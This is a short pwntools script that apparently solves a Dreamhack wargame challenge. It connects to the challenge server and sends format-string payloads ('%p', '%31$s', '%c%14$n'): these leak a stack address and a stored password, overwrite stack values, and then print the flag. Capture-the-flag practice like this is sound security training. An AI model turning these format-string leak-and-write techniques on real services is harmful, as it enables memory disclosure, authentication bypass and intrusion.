from pwn import *

port = 10611
rem = remote("host1.dreamhack.games", port)

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", b"%p")
rsp_addr = int(rem.recvn(14)[2:].decode(), 16)

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", b"%31$s")
pwd = u64(rem.recvn(7) + b"\x00")

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", p64(pwd))
rem.sendlineafter(b": ", b"wyv3rn")

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", p64(pwd))
rem.sendlineafter(b": ", p64(rsp_addr + 0x20))

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", p64(pwd))
rem.sendlineafter(b": ", p64(rsp_addr + 0x24))

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", b"%c%14$n")

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", b"%c%16$n")

rem.sendlineafter(b">> ", b"1")
rem.sendlineafter(b">> ", b"3")
rem.recvuntil(b"flag!\n")
print(rem.recvline().rstrip())